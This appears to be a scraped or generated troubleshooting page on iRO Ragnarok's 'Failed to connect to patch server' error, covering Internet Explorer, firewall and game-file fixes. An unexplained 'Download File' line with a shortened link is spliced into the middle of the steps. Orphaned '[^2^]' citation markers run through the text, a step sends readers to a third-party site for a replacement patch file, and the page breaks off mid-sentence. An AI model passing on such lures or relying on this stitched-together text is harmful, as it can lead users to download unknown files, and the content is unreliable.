# How to Fix Iro Ragnarok Failed To Connect To Patch Server Error
 
If you are playing Iro Ragnarok, you may encounter an error message that says "Failed to connect to patch server" when you try to launch the game. This error means that your game client is unable to download the latest updates from the server, which may prevent you from logging in or playing normally. There are several possible causes and solutions for this error, and this article will guide you through them step by step.
 
## Cause 1: Internet Explorer Settings
 
One of the possible causes of this error is that your Internet Explorer settings are preventing your game client from accessing the update server. The game client uses Internet Explorer to download updates, so you need to make sure that it is configured properly. To do this, follow these steps:
 
**Download File ->->->-> [https://t.co/QTCvv9h042](https://t.co/QTCvv9h042)**


 
1. Open Internet Explorer and enter `ftp://patch1.playragnarok.com/` into the address field and then press enter. If you are presented with a list of folders that includes `aspnet_client`, `cpatch`, `csakpatch`, `patch`, `ro2patch`, and `sakpatch`, then the test was successful. Otherwise, it was unsuccessful[^2^].
2. If the test was unsuccessful, try the following solutions in order:
    - Restart your computer.
    - If you have any download managers installed, such as FlashGet, Free Download Manager, or GetRight, then configure them to not integrate with Internet Explorer[^2^].
    - Scan for and remove any malware from your computer using software such as Malwarebytes Anti-malware.
    - Reset your Internet Explorer configuration[^2^]. Note: I recommend that you create a backup of your Internet Explorer configuration before doing this. If you are unable to access the Internet or Web after resetting your configuration, then restore the backup.
    - Scan for and repair any corrupted system files[^2^].
    - If a newer version of Internet Explorer is available, then upgrade to it[^2^].
3. If the test was successful, then test whether the problem has been resolved by opening the IRO client. (Simply accessing the update server using Internet Explorer can sometimes resolve the problem.)

## Cause 2: Firewall or Antivirus Settings
 
Another possible cause of this error is that your firewall or antivirus software is blocking your game client from accessing the update server. You need to make sure that your firewall or antivirus software is not interfering with your game client. To do this, follow these steps:

1. Open and close the updater several times (no more than seven times should be necessary)[^2^].
2. Clear your DNS resolver cache[^2^]:
    - Open Command Prompt.
    - Enter `ipconfig /flushdns`.
3. If you use a third-party firewall, then test whether you can update the IRO client while the firewall is temporarily disabled[^2^]. If you can, then revise your firewall configuration accordingly. You should also do the same for your router's firewall if it has one. Warning: Do not permanently disable your router's firewall because doing so could expose your computer and any other devices on your local area network to threats.

## Cause 3: Missing or Corrupted Game Files
 
The last possible cause of this error is that your game files are missing or corrupted, which prevents your game client from updating properly. You need to make sure that your game files are intact and up to date. To do this, follow these steps:

1. Reboot your computer.
2. Download [this file](http://choobs.org/stuff/patch.inf?action=get) and replace the file in your RESTART Game Folder (Default) C:\\Gravity\\Ragnarok Restart\\ If you aren't replacing a file you are in the wrong folder.
3. Run Ragnarok Restart.exe as
